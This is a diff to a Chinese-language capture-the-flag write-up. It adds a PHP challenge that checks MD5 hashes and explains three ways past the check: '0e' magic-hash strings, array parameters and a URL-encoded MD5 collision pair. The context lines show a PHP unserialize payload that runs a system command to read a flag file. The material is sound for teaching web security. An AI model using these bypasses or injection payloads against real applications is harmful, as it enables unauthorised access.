@@ -473,3 +473,60 @@ system(“find / -name flag”)：查找所有文件名匹配flag的文件
 ```bash
 func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
 ```
+
+## [?CTF]secret of php
+ >知识点：php绕过
+
+ ```php
+  <?php
+highlight_file(__FILE__);
+include('flag.php');
+$a = $_POST['a'];
+$b = $_POST['b'];
+
+if (isset($a) && isset($b)){
+    if ($a !== $b && md5($a) == md5($b)){
+        echo "<br>yes<br>";
+    } else {
+        die("no");
+    }
+    $a = $_REQUEST['aa'];
+    $b = $_REQUEST['bb'];
+    if ($a !== $b && md5((string)$a) === md5((string)$b)){
+        echo "yes yes<br>";
+    } else {
+        die("no no");
+    }
+    $a = $_REQUEST['aaa'];
+    $b = $_REQUEST['bbb'];
+    if ((string)$a !== (string)$b && md5((string)$a) === md5((string)$b)){
+        echo "yes yes yes<br>";
+        echo "Congratulations! You have passed the second level, the flag is ".$flag."<br>";
+    } else {
+        die("no no no");
+    }
+} else {
+    echo "a or b is not set<br>";
+} 
+ ```
+第一层：
+ ​原理​​：PHP的松散比较（==）在遇到以 0e开头的字符串时，会将其视为科学计数法（即 0e123被解释为 0×10123=0）。如果两个MD5哈希都以 0e开头，松散比较会认为它们相等（0 == 0）。
+```bash
+a=240610708，MD5值为 0e462097431906509019562988736854
+b=QNKCDZO，MD5值为 0e830400451993494058024219903391
+```
+第二层：
+当参数为数组时，(string)$array会返回字符串 "Array"。因此，如果 aa和 bb是不同的数组（如 aa[]=1和 bb[]=2），则：
+
+aa !== bb成立（两个数组内容不同）。
+md5((string)aa) === md5((string)bb)也成立，因为两者都是 md5("Array")，哈希值相同
+```bash
+aa[]=1&&bb[]=2
+```
+第三层：
+这一层要求两个不同的字符串（强制转换后）具有相同的MD5哈希值（严格比较）。这需要真正的MD5碰撞（两个不同字符串产生相同的MD5值）。
+数组绕过在这里无效，因为 (string)aaa和 (string)bbb都会变成 "Array"，导致 (string)aaa === (string)bbb，不符合 !==条件。
+因此，必须使用已知的MD5碰撞对。这些碰撞对通常是二进制数据，但可以通过URL编码后作为字符串传递
+```bash
+aaa=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&bbb=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
+```
